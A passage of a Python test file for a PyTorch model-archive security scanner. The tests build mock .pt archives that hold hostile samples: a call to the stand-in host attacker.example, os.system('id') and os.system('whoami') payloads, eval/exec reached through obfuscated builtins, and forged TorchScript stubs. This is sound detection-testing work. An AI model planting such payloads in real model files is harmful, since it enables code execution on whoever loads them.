        name: str | zipfile.ZipInfo,
        *,
        phase: str,
        result: ScanResult,
        max_bytes: int | None = None,
    ) -> bytes:
        if phase == "jit_script_scan" and self._get_zip_member_name(name).endswith("source.py"):
            raise OSError("member read failed")
        return original_read_member_bytes(self, zip_file, name, phase=phase, result=result, max_bytes=max_bytes)

    monkeypatch.setattr(PyTorchZipScanner, "_read_member_bytes", fail_jit_member_read)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["analysis_incomplete"] is True
    assert "pytorch_zip_jit_member_read_failed" in result.metadata["scan_outcome_reasons"]
    read_failure_checks = [check for check in result.checks if check.name == "JIT/Network Scan Read Failure"]
    # Aggregation: per-member exception details live under `details["entries"]`
    # so even a flood of unreadable members surfaces as a single summary.
    assert len(read_failure_checks) == 1
    details = read_failure_checks[0].details
    assert details["failed_count"] == 1
    assert details["zip_entries"] == ["archive/code/debug/source.py"]
    assert details["entries"][0]["exception_type"] == "OSError"
    assert details["entries"][0]["exception"] == "member read failed"


def test_pytorch_zip_jit_scan_aggregates_many_oversize_members_into_one_check(
    tmp_path: Path,
) -> None:
    """Adversarial archives with many oversize members must not flood the checks list."""
    model_path = tmp_path / "many_large_jit_members.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        for index in range(25):
            zip_file.writestr(f"archive/code/debug/src{index}.py", b"print('hello world ')\n")

    result = PyTorchZipScanner(config={"max_jit_scan_member_bytes": 4}).scan(str(model_path))

    size_checks = [check for check in result.checks if check.name == "JIT/Network Scan Size Limit"]
    assert len(size_checks) == 1
    entries = size_checks[0].details["zip_entries"]
    assert len(entries) == 27  # 25 generated sources + byteorder + data.pkl
    assert size_checks[0].details["skipped_count"] == 27
    assert all(entry["file_size"] > 4 for entry in size_checks[0].details["entries"])
    # `scan_outcome_reasons` must be deduplicated even though many members tripped it.
    reasons = result.metadata.get("scan_outcome_reasons", [])
    assert reasons.count("pytorch_zip_jit_member_size_limit") == 1


def test_pytorch_zip_jit_size_limit_respects_disabled_checks(tmp_path: Path) -> None:
    model_path = tmp_path / "large_disabled_jit_member.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        zip_file.writestr("archive/code/debug/source.py", b"print('hello')\n")

    result = PyTorchZipScanner(
        config={"check_jit_script": False, "check_network_comm": False, "max_jit_scan_member_bytes": 4}
    ).scan(str(model_path))

    assert result.success is True
    assert "scan_outcome" not in result.metadata
    assert "analysis_incomplete" not in result.metadata
    assert not any(check.name == "JIT/Network Scan Size Limit" for check in result.checks)
    assert result.metadata["disabled_checks"] == [
        "JIT/Script Code Execution Detection",
        "Network Communication Detection",
    ]


def test_pytorch_zip_scans_pickle_members_for_network_when_pickle_scanner_disabled(tmp_path: Path) -> None:
    model_path = tmp_path / "network_in_data_pkl.pt"
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr(
            "archive/data.pkl",
            pickle.dumps({"endpoint": "http://attacker.example/model"}, protocol=4),
        )

    result = PyTorchZipScanner(config={"scanners": ["pytorch_zip"]}).scan(str(model_path))

    assert any(
        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pickle"
        for check in result.checks
    )
    network_failures = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    assert network_failures
    assert any(check.location == f"{model_path}:archive/data.pkl" for check in network_failures)


def test_pytorch_zip_scans_pickle_members_past_pickle_raw_window(tmp_path: Path) -> None:
    model_path = tmp_path / "padded_network_in_data_pkl.pt"
    payload = pickle.dumps(
        {
            "padding": "A" * 512,
            "endpoint": "http://attacker.example/model",
        },
        protocol=4,
    )
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("archive/version", "3\n")
        zip_file.writestr("archive/byteorder", "little")
        zip_file.writestr("archive/data.pkl", payload)

    result = PyTorchZipScanner(
        config={
            "pickle_root_raw_scan_limit_bytes": 64,
            "pickle_expensive_raw_scan_limit_bytes": 64,
            "max_jit_scan_member_bytes": len(payload) + 1,
        }
    ).scan(str(model_path))

    network_failures = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    assert network_failures
    assert any(check.location == f"{model_path}:archive/data.pkl" for check in network_failures)


def test_pytorch_zip_jit_scan_uses_pickle_entry_identity_for_duplicate_names(tmp_path: Path) -> None:
    model_path = tmp_path / "duplicate_source_name.pt"
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", UserWarning)
        with zipfile.ZipFile(model_path, "w") as zip_file:
            zip_file.writestr("archive/version", "3\n")
            zip_file.writestr("archive/byteorder", "little")
            zip_file.writestr("archive/code/payload.py", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
            zip_file.writestr(
                "archive/code/payload.py",
                b"import urllib.request\nurllib.request.urlopen('http://attacker.example/model')\n",
            )

    result = PyTorchZipScanner().scan(str(model_path))

    network_failures = [
        check
        for check in result.checks
        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
    ]
    assert network_failures
    assert any(check.location == f"{model_path}:archive/code/payload.py" for check in network_failures)


@pytest.mark.performance
def test_pytorch_zip_skips_numeric_data_files(tmp_path):
    """Test that numeric tensor data files in archive/data/ are skipped during JIT scanning."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")

        # Add a normal pickle file
        data = {"weights": [1, 2, 3]}
        pickled_data = pickle.dumps(data)
        zipf.writestr("archive/data.pkl", pickled_data)

        # Add numeric tensor data files (these should be skipped)
        # Create a large-ish binary file to simulate real tensor data
        large_binary_data = b"\x00" * 10_000_000  # 10MB of zeros
        zipf.writestr("archive/data/0", large_binary_data)
        zipf.writestr("archive/data/1", large_binary_data)
        zipf.writestr("archive/data/123", large_binary_data)

    scanner = PyTorchZipScanner()

    # Measure scan time - should be fast since numeric files are skipped
    start_time = time.time()
    result = scanner.scan(str(zip_path))
    elapsed_time = time.time() - start_time

    # CI timing can vary significantly by runner and OS; keep a conservative
    # upper bound that still catches pathological regressions.
    max_expected_seconds = 20.0
    assert elapsed_time < max_expected_seconds, f"Scan took {elapsed_time:.2f}s, expected < {max_expected_seconds:.0f}s"
    assert result.success is True


def test_pytorch_zip_scans_non_numeric_files_in_archive_data(tmp_path: Path) -> None:
    """Test that non-numeric files in archive/data/ are still scanned for security."""
    zip_path = tmp_path / "model.pt"

    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")

        # Add a normal pickle file
        data = {"weights": [1, 2, 3]}
        pickled_data = pickle.dumps(data)
        zipf.writestr("archive/data.pkl", pickled_data)

        # Add a non-numeric file with suspicious content in archive/data/
        # This should NOT be skipped
        malicious_code = b"import os; os.system('whoami')"
        zipf.writestr("archive/data/malicious.py", malicious_code)

        # Add a numeric file (should be skipped)
        zipf.writestr("archive/data/0", b"\x00" * 1000)

    scanner = PyTorchZipScanner()
    result = scanner.scan(str(zip_path))

    python_file_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert python_file_failures
    assert any(check.location == f"{zip_path}:archive/data/malicious.py" for check in python_file_failures)


def test_pytorch_zip_scans_unmarked_python_blobs_in_archive_data(tmp_path: Path) -> None:
    """A disguised Python source blob in archive/data/ must still reach the JIT detector."""
    zip_path = tmp_path / "model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr(
            "archive/data/payload.bin",
            b"""
            def payload():
                import os
                return os.system("id")
            """,
        )

    result = PyTorchZipScanner().scan(str(zip_path))

    jit_failures = [
        check
        for check in result.checks
        if check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
    ]
    assert jit_failures
    assert any(check.location == f"{zip_path}:archive/data/payload.bin" for check in jit_failures)


@pytest.mark.parametrize(
    "payload",
    [
        b"getattr(__builtins__, 'eval')('1 + 1')\n",
        b"__builtins__['ev' + 'al']('1 + 1')\n",
        b"__builtins__.__dict__.get('eval')('1 + 1')\n",
        b"import builtins as bi\nbi.eval('1 + 1')\n",
        b"from builtins import eval as run\nrun('1 + 1')\n",
        b"globals()['__builtins__']['ev' + 'al']('1 + 1')\n",
        b"globals().get('__builtins__').get('eval')('1 + 1')\n",
        b"getattr(globals()['__builtins__'], 'eval')('1 + 1')\n",
        b"namespace = globals()\nnamespace['__builtins__']['ev' + 'al']('1 + 1')\n",
        b"namespace = globals()\nnamespace.get('__builtins__').get('eval')('1 + 1')\n",
        b"namespace = globals()\ngetattr(namespace['__builtins__'], 'eval')('1 + 1')\n",
        b"lookup = globals().get\nlookup('__builtins__').get('ev' + 'al')('1 + 1')\n",
        b"namespace = globals()\nlookup = namespace.get\nlookup('__builtins__')['ev' + 'al']('1 + 1')\n",
        b"lookup = globals()['__builtins__'].get\nlookup('ev' + 'al')('1 + 1')\n",
        b"lookup = globals()['__builtins__'].__getitem__\nlookup('ev' + 'al')('1 + 1')\n",
    ],
)
def test_pytorch_zip_scans_static_builtin_indirection_in_archive_data(tmp_path: Path, payload: bytes) -> None:
    """A disguised source member using the builtin namespace still receives JIT analysis."""
    zip_path = tmp_path / "model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    jit_failures = [
        check
        for check in result.checks
        if check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(
        check.location == f"{zip_path}:archive/data/payload.bin" and "Dangerous function call 'eval'" in check.message
        for check in jit_failures
    )


@pytest.mark.parametrize(
    ("payload", "builtin"),
    [
        (b"import builtins as bi\nbi.open('result.txt', 'w')\n", "open"),
        (b"import builtins as bi\ngetattr(bi, 'op' + 'en')('result.txt', 'w')\n", "open"),
        (b"from builtins import compile as build\nbuild('x = 1', '<x>', 'exec')\n", "compile"),
    ],
)
def test_pytorch_zip_scans_aliased_modeled_builtins_in_archive_data(
    tmp_path: Path,
    payload: bytes,
    builtin: str,
) -> None:
    zip_path = tmp_path / "model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    jit_failures = [
        check
        for check in result.checks
        if check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(
        check.location == f"{zip_path}:archive/data/payload.bin"
        and f"Dangerous function call '{builtin}'" in check.message
        for check in jit_failures
    )


@pytest.mark.parametrize(
    "payload",
    [
        b"callbacks = {'eval': len}\ncallbacks['eval']([])\n",
        b"import builtins as bi\nbi.len([1])\n",
        b"globals()['__builtins__']['len']([1])\n",
        b"globals = lambda: {'__builtins__': {'eval': len}}\nglobals()['__builtins__']['eval']([])\n",
        b"namespace = globals()\nnamespace['__builtins__']['len']([1])\n",
        (
            b"namespace = globals()\n"
            b"namespace = {'__builtins__': {'eval': len}}\n"
            b"namespace['__builtins__']['eval']([])\n"
        ),
        (b"namespace = globals()\nnamespace['__builtins__']['eval'] = len\nnamespace['__builtins__']['eval']([])\n"),
        b"lookup = globals().get\nlookup('__builtins__').get('len')([1])\n",
        b"mapping = {'eval': len}\nlookup = mapping.get\nlookup('eval')([])\n",
        b"globals()['__builtins__'].__setitem__('eval', len)\nglobals()['__builtins__']['eval']([])\n",
        b"globals()['__builtins__'].update({'eval': len})\nglobals()['__builtins__']['eval']([])\n",
        b"def payload():\n    eval = len\n    return eval([])\n",
        (
            b"def payload():\n"
            b"    namespace = globals()\n"
            b"    namespace['__builtins__']['eval'] = len\n"
            b"    return namespace['__builtins__']['eval']([])\n"
        ),
    ],
)
def test_pytorch_zip_ignores_benign_builtin_shaped_access_in_archive_data(tmp_path: Path, payload: bytes) -> None:
    """Ordinary mappings and harmless builtin use must remain benign."""
    zip_path = tmp_path / "model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


@pytest.mark.parametrize(
    "payload",
    [
        (
            b"namespace = globals()\n"
            b"namespace['__builtins__']['eval'] = __builtins__['exec']\n"
            b"namespace['__builtins__']['eval']('pass')\n"
        ),
        (
            b"globals()['__builtins__'].__setitem__('eval', __builtins__['exec'])\n"
            b"globals()['__builtins__']['eval']('pass')\n"
        ),
        (
            b"globals()['__builtins__'].update({'eval': __builtins__['exec']})\n"
            b"globals()['__builtins__']['eval']('pass')\n"
        ),
    ],
)
def test_pytorch_zip_detects_dangerous_builtin_reassignment_in_archive_data(tmp_path: Path, payload: bytes) -> None:
    zip_path = tmp_path / "model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        zipf.writestr("archive/data/payload.bin", payload)

    result = PyTorchZipScanner().scan(str(zip_path))

    jit_failures = [
        check
        for check in result.checks
        if check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
    ]
    assert any("Dangerous function call 'exec'" in check.message for check in jit_failures)


def test_pytorch_zip_ignores_non_source_eval_text_in_archive_data(tmp_path: Path) -> None:
    """Plain payload text containing a dangerous substring must not become a JIT false positive."""
    zip_path = tmp_path / "model.pt"
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("archive/version", "3")
        zipf.writestr("archive/data.pkl", pickle.dumps({"note": "eval("}))

    result = PyTorchZipScanner().scan(str(zip_path))

    assert not any(
        check.name == "JIT/Script Code Execution Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_pytorch_zip_allows_torchscript_generated_python_files(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "scripted.pt", prefix="archive")
    debug_pkl = b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00."
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            "archive/code/__torch__.py",
            "\n".join(
                [
                    "class Module(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  training : bool",
                    "  def forward(self: __torch__.Module,",
                    "    x: Tensor) -> Tensor:",
                    "    return torch.relu(x)",
                    "",
                ]
            ),
        )
        zip_file.writestr("archive/code/__torch__.py.debug_pkl", debug_pkl)
        zip_file.writestr(
            "archive/code/__torch__/torch/nn/modules/container.py",
            "\n".join(
                [
                    "class Sequential(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  training : bool",
                    "  def forward(self: __torch__.torch.nn.modules.container.Sequential,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr("archive/code/__torch__/torch/nn/modules/container.py.debug_pkl", debug_pkl)

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    python_successes = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.PASSED
    ]
    assert python_failures == []
    assert len(python_successes) == 1
    assert python_successes[0].message == "No unexpected Python code files found in model"
    assert not [
        issue
        for issue in result.issues
        if issue.location
        and "archive/code/__torch__" in issue.location
        and issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]


def test_pytorch_zip_requires_exact_case_torchscript_debug_pair(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "scripted_case_mismatch.pt", prefix="archive")
    source_path = "archive/code/__torch__/PAYLOAD.py"
    debug_pkl = b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00."
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr("archive/code/__torch__/payload.py.debug_pkl", debug_pkl)

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert any(
        issue.location == f"{model_path}:{source_path}" and issue.severity == IssueSeverity.WARNING
        for issue in result.issues
    )


def test_pytorch_zip_requires_exact_case_torchscript_tree(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "scripted_tree_case_mismatch.pt", prefix="archive")
    source_path = "archive/code/__TORCH__/payload.py"
    debug_pkl = b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00."
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr("archive/code/__TORCH__/payload.py.debug_pkl", debug_pkl)

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert any(
        issue.location == f"{model_path}:{source_path}" and issue.severity == IssueSeverity.WARNING
        for issue in result.issues
    )


def test_pytorch_zip_does_not_allow_nested_torchscript_generated_python_files(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "nested_scripted.pt", prefix="archive")
    nested_path = "archive/data/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(nested_path, "class Payload:\n    pass\n")

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    failed_files = {check.details["file"] for check in python_failures}

    assert nested_path in failed_files
    assert any(
        issue.location == f"{model_path}:{nested_path}" and issue.severity == IssueSeverity.WARNING
        for issue in result.issues
    )


def test_pytorch_zip_still_warns_on_unexpected_python_files(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/code/helper.py", "print('not generated TorchScript source')\n")
        zip_file.writestr("archive/data/malicious.py", "import os\nos.system('id')\n")

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    failed_files = {check.details["file"] for check in python_failures}
    assert {"archive/code/helper.py", "archive/data/malicious.py"}.issubset(failed_files)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_unpaired_python_under_torchscript_tree(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr("archive/code/__torch__/payload.py", "import os\nos.system('id')\n")

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == "archive/code/__torch__/payload.py" for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_forged_torchscript_debug_pair(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            "archive/code/__torch__/payload.py",
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return __import__('os').system('id')",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == "archive/code/__torch__/payload.py" for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_builtins_indirection(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return __globals__['__builtins__']['__import__']('os').system('id')",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_markers_only_in_comments(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  # __parameters__ = []",
                    "  # __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_breakpoint_body_call(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return breakpoint()",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_print_body_call(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return print('pwn')",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert result.success is True
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_nul_byte(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            (
                b"class Payload(Module):\n"
                b"  __parameters__ = []\n"
                b"  __buffers__ = []\n"
                b"  def forward(self: __torch__.Payload,\n"
                b"    x: Tensor) -> Tensor:\n"
                b"    return x\n"
                b"\x00"
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert result.success is True
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_class_decorator_call(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "@torch.classes.load_library('libpayload.so')",
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_class_assignment_call(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  payload = torch.classes.load_library('libpayload.so')",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_warns_on_torchscript_stub_with_class_keyword_call(tmp_path: Path) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt", prefix="archive")
    source_path = "archive/code/__torch__/payload.py"
    with zipfile.ZipFile(model_path, "a") as zip_file:
        zip_file.writestr(
            source_path,
            "\n".join(
                [
                    "class Payload(Module, metaclass=print('loaded')):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Payload,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "class Benign(Module):",
                    "  __parameters__ = []",
                    "  __buffers__ = []",
                    "  def forward(self: __torch__.Benign,",
                    "    x: Tensor) -> Tensor:",
                    "    return x",
                    "",
                ]
            ),
        )
        zip_file.writestr(
            "archive/code/__torch__/payload.py.debug_pkl",
            b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00.",
        )

    result = PyTorchZipScanner().scan(str(model_path))

    python_failures = [
        check
        for check in result.checks
        if check.name == "Python Code File Detection" and check.status == CheckStatus.FAILED
    ]
    assert any(check.details.get("file") == source_path for check in python_failures)
    assert all(check.severity == IssueSeverity.WARNING for check in python_failures)


def test_pytorch_zip_numeric_detection_edge_cases(tmp_path):
